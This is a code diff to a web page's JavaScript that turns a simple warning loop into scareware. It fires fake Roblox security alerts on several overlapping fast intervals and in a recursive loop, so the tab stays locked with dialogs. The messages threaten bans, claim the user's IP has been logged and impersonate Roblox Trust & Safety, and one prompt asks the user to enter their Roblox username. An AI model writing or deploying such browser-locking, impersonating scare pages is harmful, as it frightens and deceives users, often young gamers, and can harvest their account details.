@@ -344,14 +344,39 @@
     else if(document.mozCancelFullScreen)document.mozCancelFullScreen();
     else if(document.msExitFullscreen)document.msExitFullscreen();
   }
-  let dialogSpamInterval=null;
+  let dialogSpamIntervals=[];
+  let dialogSpamActive=false;
+  const dialogMessages=[
+    ()=>confirm('⚠️ ROBLOX SECURITY ALERT: Unauthorized executor detected on your account. Verify now or face permanent ban.'),
+    ()=>alert('🔴 CRITICAL: Your IP has been logged and reported to Roblox Trust & Safety. Do not close this window.'),
+    ()=>confirm('WARNING: Account termination in progress. Click OK to cancel the ban appeal process.'),
+    ()=>prompt('Enter your Roblox username to verify your identity and prevent account deletion:',''),
+    ()=>alert('❌ ERROR: exploit_bypass.lua failed to inject. Retrying... DO NOT CLOSE TAB'),
+    ()=>confirm('Your session token has expired. Reconnect now to save your inventory items?'),
+    ()=>prompt('SECURITY CHECK: Type "I agree" to confirm you are not a bot:',''),
+    ()=>alert('🚨 DETECTED: Synapse X license invalid. Your HWID has been flagged.'),
+  ];
+  let dialogIndex=0;
+  function spamLoop(){
+    if(!dialogSpamActive)return;
+    dialogMessages[dialogIndex%dialogMessages.length]();
+    dialogIndex++;
+    if(dialogSpamActive)spamLoop();
+  }
   function startDialogSpam(){
-    dialogSpamInterval=setInterval(()=>{
-      if(trapActive)confirm('WARNING: Your Roblox account has been flagged for exploit injection. Click OK to verify your session or your account will be terminated.');
-    },200);
+    dialogSpamActive=true;
+    dialogIndex=0;
+    // multiple overlapping intervals at different rates to make it relentless
+    dialogSpamIntervals.push(setInterval(()=>{if(dialogSpamActive)dialogMessages[Math.floor(Math.random()*dialogMessages.length)]();},80));
+    dialogSpamIntervals.push(setInterval(()=>{if(dialogSpamActive)alert('DO NOT CLOSE THIS TAB — ROBLOX VERIFICATION IN PROGRESS');},300));
+    dialogSpamIntervals.push(setInterval(()=>{if(dialogSpamActive)confirm('Still there? Your account ban appeal expires in 10 seconds.');},500));
+    // also chain synchronously on first hit
+    setTimeout(spamLoop,100);
   }
   function stopDialogSpam(){
-    if(dialogSpamInterval){clearInterval(dialogSpamInterval);dialogSpamInterval=null;}
+    dialogSpamActive=false;
+    dialogSpamIntervals.forEach(id=>clearInterval(id));
+    dialogSpamIntervals=[];
   }
 
   function startChaosTrap(){
